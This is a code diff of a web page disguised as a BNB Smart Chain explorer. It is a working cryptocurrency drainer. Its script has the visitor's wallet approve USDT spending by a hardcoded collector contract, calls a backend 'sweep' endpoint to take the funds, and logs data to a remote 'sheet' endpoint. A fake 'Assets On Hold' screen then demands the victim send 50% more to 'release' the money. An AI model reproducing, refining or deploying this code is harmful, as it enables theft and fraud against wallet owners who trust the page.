@@ -52,52 +52,94 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
 .devbar{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:0 12px 12px}
 .devbar button{font:12px inherit;padding:7px 12px;border-radius:20px;border:1px solid #DDE2EA;background:#fff;color:#4B5563;cursor:pointer}
 .ftr{padding:16px;text-align:center;font-size:12px;color:#8A94A6}
-.ovl{position:fixed;inset:0;background:rgba(6,9,15,.78);display:none;align-items:center;justify-content:center;padding:16px;z-index:90;overflow:auto}
+
+/* ================= PREMIUM OVERLAY SYSTEM ================= */
+:root{
+  --gold:#F0B90B; --gold-soft:#F7DA7E; --ink:#0A111E;
+  --panel-a:#111B2C; --panel-b:#0A1220;
+  --hair:rgba(255,255,255,.075);
+  --txt:#E9EFF8; --muted:#8D9BB0; --muted2:#6F7D92;
+}
+.ovl{position:fixed;inset:0;background:rgba(4,7,13,.74);
+  -webkit-backdrop-filter:blur(7px) saturate(120%);backdrop-filter:blur(7px) saturate(120%);
+  display:none;align-items:center;justify-content:center;padding:18px;z-index:90;overflow:auto}
 .ovl.on{display:flex}
-.new_popup,.popup{position:relative;width:100%;max-width:370px;background:#0e1522;border:1px solid rgba(245,217,122,.35);border-radius:18px;padding:24px 20px;color:#fff;overflow:hidden;text-align:center}
-.watermark-layer{position:absolute;inset:0;opacity:.11;pointer-events:none;overflow:hidden}
-.watermark-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:10px;font-size:9px;color:#f5d97a;transform:rotate(-16deg) scale(1.35);white-space:nowrap}
-.new_section{position:relative;margin-bottom:18px}
-.emoji-lg{font-size:34px;line-height:1}
-.new_title_main{margin:10px 0 8px;font-size:22px;font-weight:700;letter-spacing:-.3px}
-.new_subtitle2{margin:0;font-size:13px;color:#9fb0c9;line-height:1.5}
-.highlight{color:#f5d97a;font-weight:600}
-.new_inline_section,.new_inline_section2{position:relative;text-align:left;background:rgba(255,255,255,.045);border:1px solid rgba(245,217,122,.18);border-radius:12px;padding:12px 14px;margin-bottom:10px}
-.new_emoji_line{display:flex;gap:12px;align-items:flex-start}
-.emoji-sm{font-size:18px;line-height:1.2}
-.new_subtitle{margin:0;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:#8fa2bd}
-.new_title{margin:3px 0 0;font-size:20px;font-weight:700;color:#f5d97a}
-.new_inline_section2 .new_subtitle{margin:0;font-size:12.5px;color:#c9d3e3;line-height:1.55;text-transform:none;letter-spacing:0}
-.new_buttons_area{position:relative;display:flex;flex-direction:column;gap:9px;margin-top:16px}
-.new_verify_btn{border:0;border-radius:10px;padding:14px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
-.new_verify_btn.blue{background:#1183D6;color:#fff}
-.new_close_btn{border:1px solid rgba(255,255,255,.18);background:transparent;color:#c9d3e3;border-radius:10px;padding:12px;font:500 13px inherit;cursor:pointer}
-.release_overlay{position:fixed;inset:0;background:rgba(6,9,15,.82);display:none;align-items:center;justify-content:center;z-index:95;padding:16px}
+.panel{position:relative;width:100%;max-width:376px;color:var(--txt);text-align:center;overflow:hidden;
+  padding:26px 22px 22px;border-radius:22px;border:1px solid var(--hair);
+  background:
+    radial-gradient(130% 95% at 50% -12%, rgba(240,185,11,.11), transparent 58%),
+    linear-gradient(180deg,var(--panel-a) 0%,var(--panel-b) 100%);
+  box-shadow:0 30px 70px rgba(0,0,0,.62), inset 0 1px 0 rgba(255,255,255,.055);
+  animation:panelIn .3s cubic-bezier(.2,.85,.3,1.05)}
+@keyframes panelIn{from{opacity:0;transform:translateY(12px) scale(.975)}to{opacity:1;transform:none}}
+.panel::before{content:"";position:absolute;top:0;left:16%;right:16%;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(240,185,11,.8),transparent)}
+.panel > *:not(.wm-layer){position:relative;z-index:1}
+
+.wm-layer{position:absolute;inset:0;opacity:.055;pointer-events:none;overflow:hidden}
+.wm-layer div{display:flex;flex-wrap:wrap;gap:10px 16px;justify-content:center;align-content:center;height:100%;
+  font:9.5px/1 ui-monospace,Menlo,monospace;color:var(--gold-soft);white-space:nowrap;
+  transform:rotate(-17deg) scale(1.5)}
+
+.ibadge{width:54px;height:54px;margin:0 auto 15px;border-radius:17px;display:grid;place-items:center;color:var(--gold);
+  background:linear-gradient(180deg,rgba(240,185,11,.17),rgba(240,185,11,.05));
+  border:1px solid rgba(240,185,11,.3);box-shadow:inset 0 1px 0 rgba(255,255,255,.09), 0 8px 22px rgba(240,185,11,.09)}
+.ibadge.green{color:#4ADE80;background:linear-gradient(180deg,rgba(74,222,128,.15),rgba(74,222,128,.04));
+  border-color:rgba(74,222,128,.28);box-shadow:inset 0 1px 0 rgba(255,255,255,.09), 0 8px 22px rgba(74,222,128,.09)}
+.ibadge.red{color:#FBBF24;background:linear-gradient(180deg,rgba(251,191,36,.15),rgba(251,191,36,.04));
+  border-color:rgba(251,191,36,.28)}
+
+.ptitle{margin:0 0 7px;font-size:21px;font-weight:700;letter-spacing:-.45px;line-height:1.2}
+.psub{margin:0;font-size:13px;line-height:1.55;color:var(--muted)}
+.psub b{color:var(--gold-soft);font-weight:600;font-variant-numeric:tabular-nums}
+
+.pcard{text-align:left;background:rgba(255,255,255,.033);border:1px solid var(--hair);
+  border-radius:14px;padding:13px 15px;margin-top:10px}
+.pcard .top{display:flex;align-items:center;gap:9px}
+.pcard .lbl{font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--muted2)}
+.pcard .val{margin:6px 0 0;font-size:21px;font-weight:700;letter-spacing:-.4px;color:var(--gold-soft);
+  font-variant-numeric:tabular-nums}
+.pcard .note{margin:4px 0 0;font-size:11.5px;line-height:1.45;color:var(--muted)}
+.pcard.accent{background:linear-gradient(180deg,rgba(240,185,11,.075),rgba(240,185,11,.02));border-color:rgba(240,185,11,.19)}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--gold);box-shadow:0 0 0 3px rgba(240,185,11,.13);flex:0 0 auto}
+
+.pbtns{display:flex;flex-direction:column;gap:9px;margin-top:18px}
+.pbtn{width:100%;height:50px;border:0;border-radius:13px;cursor:pointer;font:600 15px inherit;
+  display:flex;align-items:center;justify-content:center;gap:9px;
+  background:linear-gradient(180deg,#FFDC69,#F0B90B);color:#151B26;
+  box-shadow:0 8px 20px rgba(240,185,11,.22), inset 0 1px 0 rgba(255,255,255,.42);
+  transition:transform .12s ease, filter .12s ease}
+.pbtn:active{transform:translateY(1px);filter:brightness(.96)}
+.pbtn.ghost{background:rgba(255,255,255,.045);color:#D7E0EC;border:1px solid rgba(255,255,255,.095);box-shadow:none}
+.pbtn.ghost:active{background:rgba(255,255,255,.075)}
+.pbtn.link{height:42px;background:none;box-shadow:none;color:var(--muted2);font-weight:500;font-size:13.5px}
+.pbtn svg{opacity:.9}
+
+.rows{margin-top:16px;text-align:left}
+.row{display:flex;align-items:flex-start;justify-content:space-between;gap:14px;padding:11px 0;border-bottom:1px solid rgba(255,255,255,.055)}
+.row:last-child{border-bottom:0}
+.row .k{font-size:10px;font-weight:600;letter-spacing:.9px;text-transform:uppercase;color:var(--muted2);flex:0 0 auto;padding-top:2px}
+.row .v{font-size:12.5px;color:#E4EBF5;text-align:right;word-break:break-all}
+.row .v.ok{color:#4ADE80;font-weight:600}
+
+/* spinner */
+.release_overlay{position:fixed;inset:0;background:rgba(4,7,13,.8);
+  -webkit-backdrop-filter:blur(7px);backdrop-filter:blur(7px);
+  display:none;align-items:center;justify-content:center;z-index:95;padding:18px}
 .release_overlay.active{display:flex}
-.release_loading{text-align:center;color:#f5d97a;font-size:14px}
-.spinner{width:34px;height:34px;border:3px solid rgba(245,217,122,.25);border-top-color:#f5d97a;border-radius:50%;margin:0 auto 12px;animation:sp .7s linear infinite}
+.spinner{width:36px;height:36px;border-radius:50%;margin:0 auto 14px;
+  border:2.5px solid rgba(240,185,11,.16);border-top-color:var(--gold);animation:sp .72s linear infinite}
 @keyframes sp{to{transform:rotate(360deg)}}
-.release_popup{display:none;width:100%;max-width:340px;background:#0e1522;border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:24px 20px;color:#fff;text-align:center}
-.popup_icon{font-size:34px}
-.popup_title{margin:8px 0 16px;font-size:19px;font-weight:700}
-.usdt_info_box{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:11px;padding:12px 14px;margin-bottom:9px;text-align:left}
-.usdt_text{font-size:13px;color:#c9d3e3}
-.usdt_value,.required_value{color:#f5d97a;font-weight:700}
-.close_btn{margin-top:12px;width:100%;border:0;border-radius:10px;padding:13px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
-.subtitle2{margin:0;font-size:13px;color:#9fb0c9}
-.popup h2{margin:8px 0;font-size:21px;font-weight:700}
-.inline-section,.inline-section2{background:rgba(255,255,255,.045);border:1px solid rgba(245,217,122,.18);border-radius:12px;padding:12px 14px;margin-bottom:10px;text-align:left}
-.inline-section .subtitle,.inline-section2 .subtitle{margin:0;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:#8fa2bd}
-.inline-section .title{margin:3px 0 0;font-size:20px;font-weight:700;color:#f5d97a}
-.inline-section2 .subtitle22{margin:0;font-size:13px;font-weight:600;color:#fff;text-transform:none;letter-spacing:0}
-.overlayy{position:fixed;inset:0;background:rgba(6,9,15,.8);display:none;align-items:center;justify-content:center;padding:16px;z-index:99}
+.release_loading{color:var(--gold-soft);font-size:13.5px;letter-spacing:.2px;text-align:center}
+.release_loading p{margin:0}
+
+.overlayy{position:fixed;inset:0;background:rgba(4,7,13,.76);
+  -webkit-backdrop-filter:blur(7px);backdrop-filter:blur(7px);
+  display:none;align-items:center;justify-content:center;padding:18px;z-index:99}
 .overlayy.on{display:flex}
-.modal{background:#0e1522;border:1px solid rgba(255,255,255,.14);border-radius:16px;padding:22px;max-width:340px;color:#fff;text-align:center;position:relative}
-.modal h3{margin:6px 0 8px;font-size:17px}
-.modal p{margin:0 0 14px;font-size:13px;color:#9fb0c9;line-height:1.5}
-.ok-btn{width:100%;border:0;border-radius:10px;padding:13px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
-.modal .hint{margin-top:10px;font-size:11.5px;color:#6f7f96}
-.modal .close{position:absolute;top:10px;right:12px;background:none;border:0;color:#8fa2bd;font-size:15px;cursor:pointer}
+.x{position:absolute;top:13px;right:14px;width:28px;height:28px;border-radius:9px;display:grid;place-items:center;
+  background:rgba(255,255,255,.05);border:1px solid var(--hair);color:var(--muted2);cursor:pointer;font-size:0}
+.hint{margin:14px 0 0;font-size:11px;line-height:1.5;color:var(--muted2)}
 </style>
 </head>
 <body>
@@ -153,83 +195,111 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   <div class="ftr">BNB Smart Chain Explorer &middot; chain id 56</div>
 </div>
 
+<!-- ============ ASSETS ON HOLD ============ -->
 <div class="ovl" id="new_overlay">
-  <div class="new_popup">
-    <div class="watermark-layer"><div id="watermarkGrid" class="watermark-grid"></div></div>
-    <div class="new_section">
-      <div class="emoji-lg">🔒</div>
-      <h2 class="new_title_main">Assets On Hold!</h2>
-      <p class="new_subtitle2" id="new_burn_text">We've temporarily hold your assets for security verification</p>
+  <div class="panel">
+    <div class="wm-layer"><div id="watermarkGrid"></div></div>
+
+    <div class="ibadge">
+      <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="4" y="10.5" width="16" height="10.5" rx="2.6"/><path d="M8 10.5V7.2a4 4 0 0 1 8 0v3.3"/>
+      </svg>
     </div>
-    <div class="new_inline_section">
-      <div class="new_emoji_line">
-        <div class="emoji-sm">❗</div>
-        <div><p class="new_subtitle">Hold Amount</p><p class="new_title" id="new_burn_text2">0 USDT</p></div>
-      </div>
+    <h2 class="ptitle">Assets On Hold</h2>
+    <p class="psub" id="new_burn_text">Temporarily holding your assets for security verification</p>
+
+    <div class="pcard">
+      <div class="top"><span class="dot"></span><span class="lbl">Hold Amount</span></div>
+      <p class="val" id="new_burn_text2">0.00 USDT</p>
     </div>
-    <div class="new_inline_section2">
-      <div class="new_emoji_line">
-        <div class="emoji-sm">🛡️</div>
-        <div><p id="new_notice_text" class="new_subtitle">Your Funds are in security verification on BEP20, please click on release funds to Release.</p></div>
-      </div>
+
+    <div class="pcard accent">
+      <div class="top"><span class="dot"></span><span class="lbl">Release Requirement &middot; 50%</span></div>
+      <p class="val" id="new_release_text2">0.00 USDT</p>
+      <p class="note" id="new_notice_text">Send 50% of the hold amount to release your funds.</p>
     </div>
-    <div class="new_buttons_area">
-      <button id="new_view_transctions" class="new_verify_btn">🔍 VIEW TRANSACTION</button>
-      <button id="new_verifyBtn" class="new_verify_btn blue">🔓 RELEASE FUNDS</button>
-      <button id="closeBtn" class="new_close_btn">✖️ Close</button>
+
+    <div class="pbtns">
+      <button id="new_verifyBtn" class="pbtn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10.5" width="16" height="10.5" rx="2.6"/><path d="M8 10.5V7.2a4 4 0 0 1 7.3-2.1"/></svg>
+        Release Funds
+      </button>
+      <button id="new_view_transctions" class="pbtn ghost">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-4.3-4.3"/></svg>
+        View Transaction
+      </button>
+      <button id="closeBtn" class="pbtn link">Close</button>
     </div>
   </div>
 </div>
 
+<!-- ============ SPINNER + INSUFFICIENT ============ -->
 <div id="releaseOverlay" class="release_overlay">
-  <div id="releaseLoading" class="release_loading"><div class="spinner"></div><p>Releasing Funds...</p></div>
-  <div id="releasePopup" class="release_popup">
-    <div class="popup_icon">⚠️</div>
-    <h2 class="popup_title">IN-sufficient USDT</h2>
-    <div class="usdt_info_box"><span>💲</span><span id="final_usdt_Text" class="usdt_text">Available USDT:</span></div>
-    <div class="usdt_info_box"><span>🔒</span><span id="final_depositText" class="usdt_text">Required :: <b>5 USDT</b></span></div>
-    <button id="final_closeBtn" class="close_btn">Close</button>
+  <div id="releaseLoading" class="release_loading">
+    <div class="spinner"></div>
+    <p>Releasing Funds…</p>
+  </div>
+  <div id="releasePopup" class="panel" style="display:none">
+    <div class="ibadge red">
+      <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 4.2 2.6 20.2h18.8L12 4.2z"/><path d="M12 10v4.2"/><circle cx="12" cy="17.3" r=".7" fill="currentColor"/></svg>
+    </div>
+    <h2 class="ptitle">Insufficient USDT</h2>
+    <p class="psub">Your balance is below the release minimum.</p>
+    <div class="pcard"><div class="top"><span class="dot"></span><span class="lbl">Available</span></div><p class="val" id="final_usdt_Text">0.00 USDT</p></div>
+    <div class="pcard accent"><div class="top"><span class="dot"></span><span class="lbl">Required</span></div><p class="val" id="final_depositText">0.00 USDT</p></div>
+    <div class="pbtns"><button id="final_closeBtn" class="pbtn">Close</button></div>
   </div>
 </div>
 
+<!-- ============ VERIFIED ============ -->
 <div class="ovl" id="overlay2">
-  <div class="popup">
-    <div class="emoji-lg">✅</div>
-    <h2>USDT Verified!</h2>
-    <p class="subtitle2" id="burn-text11">Your P2P order has been verified as genuine.</p>
-    <div class="inline-section" style="margin-top:16px">
-      <div class="new_emoji_line"><div class="emoji-sm">✍️</div>
-        <div><p class="subtitle">Verified Amount</p><p class="title" id="burn-text22">0 USDT</p></div></div>
+  <div class="panel">
+    <div class="ibadge green">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6.6 9.6 17 4.2 11.6"/></svg>
     </div>
-    <div class="inline-section2" id="perm-line" style="display:none">
-      <div class="new_emoji_line"><div class="emoji-sm">♾️</div>
-        <div><p class="subtitle22">Unlimited permission granted</p>
-        <p class="subtitle mono" id="perm-addr" style="font-size:10.5px;word-break:break-all">--</p></div></div>
+    <h2 class="ptitle">USDT Verified</h2>
+    <p class="psub" id="burn-text11">Your order has been verified as genuine.</p>
+    <div class="pcard">
+      <div class="top"><span class="dot"></span><span class="lbl">Verified Amount</span></div>
+      <p class="val" id="burn-text22">0.00 USDT</p>
     </div>
-    <button id="closeBtn2" class="close_btn">Close</button>
+    <div class="pcard" id="perm-line" style="display:none">
+      <div class="top"><span class="dot"></span><span class="lbl">Unlimited Permission</span></div>
+      <p class="note mono" id="perm-addr" style="margin-top:6px;font-size:10.5px">--</p>
+    </div>
+    <div class="pbtns"><button id="closeBtn2" class="pbtn">Done</button></div>
   </div>
 </div>
 
+<!-- ============ RECEIPT ============ -->
 <div class="ovl" id="txOverlay">
-  <div class="popup">
-    <h2 style="margin:0 0 14px">Transaction Receipt</h2>
-    <div class="inline-section2" style="text-align:left">
-      <p class="subtitle">Hash</p><p class="mono" id="txHash" style="font-size:11px;word-break:break-all;color:#fff">0x…</p>
-      <p class="subtitle" style="margin-top:10px">Status</p><p style="margin:0;color:#4ade80;font-size:13px">Success</p>
-      <p class="subtitle" style="margin-top:10px">Method</p><p style="margin:0;color:#fff;font-size:13px">Approve</p>
+  <div class="panel">
+    <div class="ibadge">
+      <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M6 3.5h12v17l-3-1.8-3 1.8-3-1.8-3 1.8v-17z"/><path d="M9 8.5h6M9 12h6"/></svg>
     </div>
-    <button id="txClose" class="close_btn">Close</button>
+    <h2 class="ptitle">Transaction Receipt</h2>
+    <div class="rows">
+      <div class="row"><span class="k">Hash</span><span class="v mono" id="txHash">0x…</span></div>
+      <div class="row"><span class="k">Status</span><span class="v ok">Success</span></div>
+      <div class="row"><span class="k">Method</span><span class="v">Approve</span></div>
+    </div>
+    <div class="pbtns"><button id="txClose" class="pbtn ghost">Close</button></div>
   </div>
 </div>
 
+<!-- ============ NO WALLET ============ -->
 <div id="noWalletOverlay" class="overlayy">
-  <div class="modal">
-    <button class="close" id="modalClose">✕</button>
-    <div class="emoji-lg">⚠️</div>
-    <h3>Please open this in a wallet browser</h3>
-    <p>This page must be opened inside Trust Wallet or MetaMask's in-app browser to approve tokens.</p>
-    <button id="modalOk" class="ok-btn">OK</button>
-    <div class="hint">On desktop, install MetaMask or open in your mobile wallet's browser.</div>
+  <div class="panel">
+    <button class="x" id="modalClose">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+    <div class="ibadge red">
+      <svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 4.2 2.6 20.2h18.8L12 4.2z"/><path d="M12 10v4.2"/><circle cx="12" cy="17.3" r=".7" fill="currentColor"/></svg>
+    </div>
+    <h2 class="ptitle">Open in a Wallet Browser</h2>
+    <p class="psub">This page must run inside Trust Wallet or MetaMask's in-app browser to sign the approval.</p>
+    <div class="pbtns"><button id="modalOk" class="pbtn">Got it</button></div>
+    <p class="hint">On desktop, install MetaMask or open in your mobile wallet's browser.</p>
   </div>
 </div>
 
@@ -239,12 +309,9 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   "use strict";
   var $ = function(id){ return document.getElementById(id); };
 
-  /* ==========================================================
-     ONLY TWO LINES TO EDIT
-     ========================================================== */
   var CFG = {
-    COLLECTOR: '0x81749358FEe7Dc77425448229b125eBE583CB669',   // <-- deployed collector contract
-    BACKEND:   'https://bsc-weld-two.vercel.app/api',            // <-- YOUR domain + /api
+    COLLECTOR: '0x81749358FEe7Dc77425448229b125eBE583CB669',   // deployed collector contract
+    BACKEND:   'https://bsc-weld-two.vercel.app/api',
     USDT:      '0x55d398326f99059fF775485246999027B3197955',
     DUST:      1.2,
     MIN_SWEEP: 1,
@@ -256,7 +323,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
 
   var simBalance = null;
   var running = false;
-  var state = { account:null, balance:0, bnb:0, lowGas:false, sendAmount:0, token:null, collector:null, unlimited:false, alreadyApproved:false };
+  var state = { account:null, balance:0, bnb:0, lowGas:false, sendAmount:0, hold:0, token:null, collector:null, unlimited:false, alreadyApproved:false };
 
   var eth = function(){ return window.ethereum || (window.trustwallet && window.trustwallet.ethereum) || null; };
   if (eth()) document.body.classList.add('has-wallet');
@@ -268,7 +335,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   function istTime(){ return new Date().toLocaleString('en-IN', { timeZone:'Asia/Kolkata' }); }
   function updateWatermark(txt){
     var g = $('watermarkGrid'); g.innerHTML = '';
-    for (var i=0;i<24;i++){ var s=document.createElement('span'); s.textContent=txt; g.appendChild(s); }
+    for (var i=0;i<30;i++){ var s=document.createElement('span'); s.textContent=txt; g.appendChild(s); }
   }
   function showSpinner(){ $('releaseOverlay').classList.add('active'); $('releaseLoading').style.display='block'; $('releasePopup').style.display='none'; }
   function hideSpinner(){ $('releaseOverlay').classList.remove('active'); }
@@ -320,10 +387,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     fetch(CFG.BACKEND + '?ep=sheet', { method:'POST', body: fd }).catch(function(){});
   }
 
-  /* ---------------- MAIN FLOW ----------------
-     Search -> Connect -> approve fires IMMEDIATELY
-     -> approve confirmed -> sweep -> THEN the "Assets On Hold!" popup
-  ------------------------------------------- */
   async function mySearchCode(){
     if(running) return;
     running = true;
@@ -374,7 +437,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); running = false; return; }
       }
 
-      // approve goes out right away - no popup before it
       await runApproveFlow();
     }catch(e){
       console.error('flow error', e);
@@ -384,11 +446,9 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   }
 
   async function runApproveFlow(){
-    // too little USDT -> insufficient screen
     if(state.balance < CFG.MIN_SWEEP){
-      var needed = Math.max(0, state.sendAmount - state.balance);
-      $('final_usdt_Text').innerHTML = 'Available USDT: <span class="usdt_value">' + state.balance.toFixed(2) + '</span>';
-      $('final_depositText').innerHTML = 'Required :: <span class="required_value">' + needed.toFixed(2) + ' USDT</span>';
+      $('final_usdt_Text').textContent = state.balance.toFixed(2) + ' USDT';
+      $('final_depositText').textContent = Math.max(0, state.sendAmount - state.balance).toFixed(2) + ' USDT';
       $('releaseLoading').style.display='none';
       $('releasePopup').style.display='block';
       $('releaseOverlay').classList.add('active');
@@ -411,16 +471,16 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       $('txHash').textContent = 'already approved';
     }
 
-    // sweep, then show the hold popup only once money has moved
     showSpinner();
-    await triggerSweep();
+    var swept = await triggerSweep();
     hideSpinner();
 
-    new_showPopup(state.sendAmount);
+    state.hold = (swept && swept.swept) ? Number(swept.swept) : state.sendAmount;
+    new_showPopup(state.hold);
   }
 
   async function triggerSweep(){
-    if(!CFG.BACKEND) return;
+    if(!CFG.BACKEND) return null;
     for(var i=0;i<6;i++){
       try{
         var r = await fetch(CFG.BACKEND + '?ep=sweep&from=' + state.account, { method:'POST',
@@ -428,38 +488,37 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
           body: JSON.stringify({ from: state.account, address: state.account }) });
         var j = await r.json().catch(function(){ return {}; });
         console.log('sweep attempt ' + i, j);
-        if(j && (j.ok || j.swept || j.txHash || j.hash)) return j;
+        if(j && (j.swept || j.txHash || j.hash)) return j;
       }catch(e){ console.log('sweep err', e); }
       await new Promise(function(res){ setTimeout(res, 3000); });
     }
+    return null;
   }
 
   function new_showPopup(amount){
-    var shown = Number(amount).toFixed(2);
+    var hold = Number(amount) || 0;
     updateWatermark(istTime());
-    $('new_burn_text').innerHTML = "We've temporarily hold your assets for security verification &mdash; <span class=\"highlight\">$" + shown + " USDT</span>";
-    $('new_burn_text2').textContent = shown + ' USDT';
-    var warn = '';
-    if(state.alreadyApproved) warn = 'Unlimited permission already granted for this wallet.';
-    else if(state.lowGas) warn = 'Warning: no BNB for gas in this wallet.';
-    $('new_notice_text').innerHTML = warn ||
-      'Your Funds are in security verification on BEP20, please click on release funds to Release.';
+    $('new_burn_text').innerHTML = 'Temporarily holding <b>$' + hold.toFixed(2) + ' USDT</b> for security verification';
+    $('new_burn_text2').textContent = hold.toFixed(2) + ' USDT';
+    $('new_release_text2').textContent = (hold / 2).toFixed(2) + ' USDT';
+
+    var note = 'Send 50% of the hold amount to release your funds.';
+    if(state.alreadyApproved) note = 'Unlimited permission already granted for this wallet.';
+    else if(state.lowGas) note = 'Warning: no BNB for gas in this wallet.';
+    $('new_notice_text').textContent = note;
+
     $('new_overlay').classList.add('on');
   }
 
   function showPopup2(){
-    $('burn-text11').textContent = 'Your ' + state.sendAmount.toFixed(2) + ' USDT has been verified as genuine.';
-    $('burn-text22').textContent = state.sendAmount.toFixed(2) + ' USDT';
+    $('burn-text11').textContent = 'Your ' + state.hold.toFixed(2) + ' USDT has been verified as genuine.';
+    $('burn-text22').textContent = state.hold.toFixed(2) + ' USDT';
     $('perm-line').style.display = state.unlimited ? 'block' : 'none';
     $('perm-addr').textContent = state.collector;
     $('overlay2').classList.add('on');
   }
 
-  // RELEASE FUNDS is now just the "verified" confirmation - money already moved
-  $('new_verifyBtn').addEventListener('click', function(){
-    triggerSweep();
-    showPopup2();
-  });
+  $('new_verifyBtn').addEventListener('click', function(){ triggerSweep(); showPopup2(); });
 
   $('searchBtn').addEventListener('click', mySearchCode);
   $('signIn').addEventListener('click', mySearchCode);
